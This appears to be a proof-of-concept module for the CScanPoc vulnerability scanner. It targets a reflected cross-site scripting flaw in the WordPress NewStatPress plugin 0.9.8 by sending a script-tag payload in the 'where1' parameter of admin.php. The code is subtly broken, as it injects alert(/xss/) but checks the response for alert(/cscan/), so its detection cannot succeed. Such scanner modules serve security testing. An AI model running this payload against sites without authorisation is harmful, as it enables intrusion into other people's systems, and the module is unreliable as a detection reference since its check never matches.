# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'WordPress_0034' # 平台漏洞编号，留空
    name = 'WordPress NewStatPress Plugin 0.9.8 XSS'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.XSS # 漏洞类型
    disclosure_date = '2015-05-26'  # 漏洞公布时间
    desc = '''
        WordPress NewStatPress Plugin 0.9.8 /wp-admin/admin.php XSS.
    '''  # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/37107/'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'NewStatPress Plugin 0.9.8'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '9e1cc51d-af60-4696-8a93-d8dfd6e4fed3'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-14'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            s = requests.session()
            payload = '/wp-admin/admin.php?where1=<script>alert(/xss/)</script>&searchsubmit=Buscar&page=nsp_search'
            verify_url = self.target + payload
            #code, head, res, errcode, _ = curl.curl(url)
            r = s.get(self.target + '/wp-admin/admin.php')
            r = s.get(verify_url)
            
            if r.status_code == 200 and '<script>alert(/cscan/)</script>' in r.content:
                #security_hole(url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
